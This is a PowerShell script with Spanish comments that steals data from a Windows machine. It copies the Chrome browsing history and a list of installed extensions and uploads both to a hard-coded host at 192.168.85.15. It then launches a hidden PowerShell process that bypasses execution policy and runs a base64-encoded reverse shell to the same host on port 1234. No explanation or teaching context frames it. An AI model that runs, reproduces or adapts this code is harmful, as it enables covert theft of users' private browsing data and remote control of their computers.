# ========================
# Recolección de historial 
# ========================
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME

$histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHist = "$env:TEMP\history_copy.sqlite"

if (Test-Path $histPath) {
    Copy-Item $histPath $tempHist -Force

    # Enviar archivo SQLite como binario
    $histFileName = "historial_${computerName}_${username}_$timestamp.sqlite"
    Invoke-WebRequest -Uri "http://192.168.85.15:8080/upload?file=$histFileName" -Method POST -InFile $tempHist -UseBasicParsing
}

# =============================
# Recolección de extensiones
# =============================
$extPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"
$outExtFile = "$env:TEMP\extensiones_extraidas.txt"

"EXTENSIONES DE CHROME - Usuario: $username`n" | Out-File $outExtFile

if (Test-Path $extPath) {
    $manifests = Get-ChildItem -Path $extPath -Recurse -Filter "manifest.json" -ErrorAction SilentlyContinue

    if ($manifests.Count -eq 0) {
        "No se encontraron archivos manifest.json" | Out-File -Append $outExtFile
    }

    foreach ($manifest in $manifests) {
        try {
            $json = Get-Content $manifest.FullName -Raw | ConvertFrom-Json -ErrorAction Stop
            $name = if ($json.name) { $json.name } else { "Desconocido" }
            $desc = if ($json.description) { $json.description } else { "N/A" }
            $version = if ($json.version) { $json.version } else { "N/A" }
            $perms = if ($json.permissions) { $json.permissions -join ', ' } else { "Sin permisos" }

            $info = @"
-------------------------------
Nombre     : $name
Descripción: $desc
Versión    : $version
Permisos   : $perms
Ruta       : $($manifest.FullName)
-------------------------------
"@
            $info | Out-File -Append $outExtFile
        } catch {
            "[!] Error leyendo $($manifest.FullName): $($_.Exception.Message)`n" | Out-File -Append $outExtFile
        }
    }

    # Enviar extensiones con nombre único
    $extFileName = "extensiones_${computerName}_${username}_$timestamp.txt"
    Invoke-WebRequest -Uri "http://192.168.85.15:8080/upload?file=$extFileName" -Method POST -InFile $outExtFile -UseBasicParsing
}


$encodedPayload = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADgANQAuADEANQAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-EncodedCommand", $encodedPayload -WindowStyle Hidden
exit
